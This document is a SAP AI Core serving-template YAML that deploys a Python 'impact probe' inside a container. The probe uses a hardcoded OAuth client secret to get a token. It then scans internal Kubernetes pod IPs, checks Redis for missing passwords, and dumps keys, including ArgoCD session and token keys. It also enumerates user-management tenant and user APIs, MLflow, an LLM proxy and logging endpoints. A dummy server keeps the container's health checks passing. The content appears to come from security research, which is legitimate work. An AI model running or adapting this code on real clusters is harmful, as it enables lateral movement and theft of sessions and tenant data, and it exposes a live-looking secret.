apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: impact-probe-v4
  labels:
    scenarios.ai.sap.com/id: "impact-probe-v4"
    ai.sap.com/version: "1.0.0"
  annotations:
    scenarios.ai.sap.com/name: "impact-probe-v4"
    executables.ai.sap.com/name: "impact-probe-v4"
    executables.ai.sap.com/description: "impact verification probe v4"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            cat > /tmp/probe.py << 'PYEOF'
            import os, ssl, socket, json, re, base64, time, urllib.request, urllib.error

            CLIENT_ID     = "sb-aicore-bb-12!b627551|aicore-xsuaa-std!b563784"
            CLIENT_SECRET = "aicore-bb-12-key$gbdxl0aC0lXqLFQwlGFyB2cqAAHsAen7wWYqOl89fbw="
            TOKEN_URL     = "https://cf-aicore-security-bb-12.authentication.eu10.hana.ondemand.com/oauth/token"

            def report(k, v):
                print(f"[P4] {k}: {str(v)[:6000]}", flush=True)

            def http_get(url, headers=None, timeout=10):
                try:
                    req = urllib.request.Request(url, headers=headers or {})
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                        return r.read().decode("utf-8", errors="replace"), r.status, dict(r.headers)
                except urllib.error.HTTPError as e:
                    body = ""
                    try: body = e.read().decode("utf-8", errors="replace")[:1200]
                    except: pass
                    return f"HTTP_{e.code}:{body}", e.code, {}
                except Exception as e:
                    return f"ERR:{e}", 0, {}

            def http_post_form(url, fields, headers=None, timeout=10):
                try:
                    data = "&".join(f"{k}={v}" for k, v in fields.items()).encode()
                    h = {"Content-Type": "application/x-www-form-urlencoded"}
                    if headers: h.update(headers)
                    req = urllib.request.Request(url, data=data, headers=h, method="POST")
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                        return r.read().decode("utf-8", errors="replace"), r.status
                except urllib.error.HTTPError as e:
                    body = ""
                    try: body = e.read().decode("utf-8", errors="replace")[:500]
                    except: pass
                    return f"HTTP_{e.code}:{body}", e.code
                except Exception as e:
                    return f"ERR:{e}", 0

            def redis_probe(host, port, label, timeout=8):
                """Send multiple Redis commands over one connection and read all responses."""
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(timeout)
                    s.connect((host, port))
                    # send several commands in a pipeline
                    cmds = b"PING\r\nINFO server\r\nDBSIZE\r\nCONFIG GET maxmemory\r\n"
                    s.sendall(cmds)
                    time.sleep(2)
                    resp = b""
                    s.settimeout(5)
                    try:
                        while True:
                            chunk = s.recv(16384)
                            if not chunk: break
                            resp += chunk
                    except socket.timeout:
                        pass
                    s.close()
                    decoded = resp.decode("utf-8", errors="replace")
                    report(f"REDIS_{label}_raw", repr(decoded[:800]))
                    if "+PONG" in decoded or "$" in decoded or "-" in decoded:
                        report(f"REDIS_{label}_LIVE", "YES - got Redis protocol response")
                        if "-NOAUTH" in decoded:
                            report(f"REDIS_{label}_AUTH", "requires password")
                        elif "+PONG" in decoded:
                            report(f"REDIS_{label}_NOAUTH", "NO PASSWORD REQUIRED")
                            # Try to dump keys
                            s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s2.settimeout(timeout)
                            s2.connect((host, port))
                            s2.sendall(b"SCAN 0 COUNT 100\r\nKEYS *\r\n")
                            time.sleep(2)
                            resp2 = b""
                            s2.settimeout(5)
                            try:
                                while True:
                                    c = s2.recv(16384)
                                    if not c: break
                                    resp2 += c
                            except socket.timeout:
                                pass
                            s2.close()
                            report(f"REDIS_{label}_KEYS", repr(resp2.decode("utf-8", errors="replace")[:2000]))
                except Exception as e:
                    report(f"REDIS_{label}_ERR", str(e))

            # ── fetch JWT ─────────────────────────────────────────────────────────
            cred_b64 = base64.b64encode(f"{CLIENT_ID}:{CLIENT_SECRET}".encode()).decode()
            token_body, token_code = http_post_form(
                TOKEN_URL, {"grant_type": "client_credentials"},
                headers={"Authorization": f"Basic {cred_b64}"}, timeout=15)
            JWT = json.loads(token_body)["access_token"] if token_code == 200 else None
            report("JWT", f"obtained={JWT is not None}")
            AUTH = {"Authorization": f"Bearer {JWT}"} if JWT else {}

            # ── 1. REDIS pod IPs directly ─────────────────────────────────────────
            report("---", "=== REDIS direct pod IPs ===")
            redis_targets = [
                ("100.64.0.67",   6379, "serving"),
                ("100.64.0.42",   6379, "rage-proxy-inference"),
                ("100.64.88.24",  6379, "not-diamond"),
                ("100.64.0.76",   6379, "argocd-server-0"),
                ("100.64.80.87",  6379, "argocd-haproxy"),
                # user-management redis pod IP (not known yet, try service)
                ("redis.user-management.svc.cluster.local", 6379, "user-mgmt-svc"),
            ]
            for host, port, label in redis_targets:
                redis_probe(host, port, label)

            # ── 2. NOT-DIAMOND server pod IPs ─────────────────────────────────────
            report("---", "=== NOT-DIAMOND direct pod IPs ===")
            nd_ips = ["100.64.85.27", "100.64.84.26"]
            for ip in nd_ips:
                for port in [80, 8080, 5000, 8000, 3000, 443]:
                    body, code, hdrs = http_get(f"http://{ip}:{port}/", timeout=5)
                    report(f"ND_{ip}:{port}_root", f"[{code}] hdrs={list(hdrs.keys())[:4]} {body[:300]}")
                    if code not in (0,) and "ERR" not in body[:4] and code not in (502, 503):
                        for path in ["/health", "/v1/models", "/api", "/metrics",
                                     "/v1/chat/completions", "/v1/embeddings"]:
                            b2, c2, _ = http_get(f"http://{ip}:{port}{path}", timeout=5)
                            report(f"ND_{ip}:{port}{path}", f"[{c2}] {b2[:400]}")

            # ── 3. ML-TRACKING pod IP directly ────────────────────────────────────
            report("---", "=== ML-TRACKING pod IP ===")
            ml_ip = "100.64.98.13"
            for port in [80, 5000, 8080]:
                body, code, hdrs = http_get(f"http://{ml_ip}:{port}/", headers=AUTH, timeout=8)
                report(f"MLFLOW_PODIP_{port}", f"[{code}] {body[:400]}")
                if code not in (0,):
                    for path in ["/health", "/api/2.0/mlflow/experiments/list",
                                  "/api/2.0/mlflow/runs/search"]:
                        b2, c2, _ = http_get(f"http://{ml_ip}:{port}{path}", headers=AUTH, timeout=8)
                        report(f"MLFLOW_PODIP_{port}{path.replace('/','_')}", f"[{c2}] {b2[:600]}")

            # ── 4. USER-MANAGEMENT pod IPs ────────────────────────────────────────
            report("---", "=== USER-MANAGEMENT pod IPs ===")
            um_ips = ["100.64.91.17", "100.64.89.17"]   # user-management-api pods
            for ip in um_ips:
                for port in [5000, 8080, 80]:
                    body, code, hdrs = http_get(f"http://{ip}:{port}/", headers=AUTH, timeout=8)
                    report(f"UM_PODIP_{ip}:{port}", f"[{code}] {body[:400]}")
                    if code not in (0,) and "ERR:timed" not in body:
                        for path in ["/health", "/api/v1/tenants", "/api/v1/users",
                                     "/api/v1/subaccounts"]:
                            b2, c2, _ = http_get(f"http://{ip}:{port}{path}", headers=AUTH, timeout=8)
                            report(f"UM_PODIP_{port}{path.replace('/','_')}", f"[{c2}] {b2[:500]}")

            # ── 5. ARGOCD Redis HA — read session/app data ────────────────────────
            report("---", "=== ARGOCD Redis HA ===")
            # ArgoCD stores session tokens in Redis - try to read them
            argocd_redis_ip = "100.64.0.76"
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((argocd_redis_ip, 6379))
                cmds = b"PING\r\nINFO server\r\nDBSIZE\r\nSCAN 0 COUNT 50\r\nKEYS *session*\r\nKEYS *token*\r\nKEYS *app*\r\n"
                s.sendall(cmds)
                time.sleep(3)
                resp = b""
                s.settimeout(6)
                try:
                    while True:
                        chunk = s.recv(16384)
                        if not chunk: break
                        resp += chunk
                except socket.timeout:
                    pass
                s.close()
                decoded = resp.decode("utf-8", errors="replace")
                report("ARGOCD_REDIS_raw", repr(decoded[:3000]))
            except Exception as e:
                report("ARGOCD_REDIS_ERR", str(e))

            # ── 6. GET MAIN CONTAINER IMAGES from OTel TA ────────────────────────
            report("---", "=== Main container images via OTel TA ===")
            ta_url = "http://otel-scraper-targetallocator.opentelemetry.svc.cluster.local:80/jobs/kubernetes-pods/targets"
            body_ta, code_ta, _ = http_get(ta_url, timeout=20)
            if code_ta == 200:
                try:
                    data = json.loads(body_ta)
                    seen = set()
                    for collector_id, cdata in data.items():
                        for tg in cdata.get("targets", []):
                            lbl = tg.get("labels", {})
                            ns  = lbl.get("__meta_kubernetes_namespace", "")
                            pod = lbl.get("__meta_kubernetes_pod_name", "")
                            # get all annotation keys that mention image
                            for key, val in lbl.items():
                                if "image" in key.lower() and any(
                                    s in ns.lower() or s in pod.lower()
                                    for s in ["grafana", "couchdb", "velero", "redis",
                                              "argocd", "not-diamond", "user-management"]
                                ):
                                    uid = f"{ns}/{pod}/{key}"
                                    if uid not in seen:
                                        seen.add(uid)
                                        report(f"IMG_{ns}_{pod}", f"{key}={val[:200]}")
                            # also get all container annotations (they include main container images)
                            istio_status = lbl.get("__meta_kubernetes_pod_annotation_sidecar_istio_io_status", "")
                            if istio_status and any(
                                s in ns.lower() or s in pod.lower()
                                for s in ["grafana", "couchdb", "velero"]
                            ):
                                report(f"ISTIO_STATUS_{ns}_{pod}", istio_status[:500])
                except Exception as e:
                    report("TA_PARSE_ERR", str(e))

            # ── 7. LLM-ACCESS pod (SAP LLM proxy) ────────────────────────────────
            report("---", "=== LLM-ACCESS pod IP ===")
            llm_ip = "100.64.109.21"   # llm-proxy-gsp
            for port in [80, 8080, 5000, 443]:
                body, code, hdrs = http_get(f"http://{llm_ip}:{port}/", headers=AUTH, timeout=8)
                report(f"LLM_PODIP_{port}", f"[{code}] {body[:400]}")
                if code not in (0,) and "ERR" not in body[:4]:
                    for path in ["/health", "/v1/models", "/v1/chat/completions"]:
                        b2, c2, _ = http_get(f"http://{llm_ip}:{port}{path}", headers=AUTH, timeout=8)
                        report(f"LLM_{port}{path.replace('/','_')}", f"[{c2}] {b2[:600]}")

            # ── 8. FLUENT-BIT pods (log aggregation) ─────────────────────────────
            report("---", "=== FLUENT-BIT (log exfil check) ===")
            fb_ips = ["100.64.0.18", "100.64.109.14", "100.64.94.2"]
            for ip in fb_ips[:2]:
                for port in [2020, 8080, 9090, 80]:
                    body, code, _ = http_get(f"http://{ip}:{port}/", timeout=4)
                    report(f"FLUENTBIT_{ip}:{port}", f"[{code}] {body[:300]}")
                    if code == 200:
                        for path in ["/api/v1/health", "/api/v1/metrics",
                                     "/api/v1/uptime", "/api/v1/plugins"]:
                            b2, c2, _ = http_get(f"http://{ip}:{port}{path}", timeout=4)
                            report(f"FLUENTBIT_{port}{path.replace('/','_')}", f"[{c2}] {b2[:400]}")
                        break

            report("DONE", "probe v4 complete")
            PYEOF
            python3 /tmp/probe.py 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self):
                    self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
          ports:
          - containerPort: 8080
            protocol: TCP
          readinessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 30
            periodSeconds: 10
          livenessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 30
            periodSeconds: 15
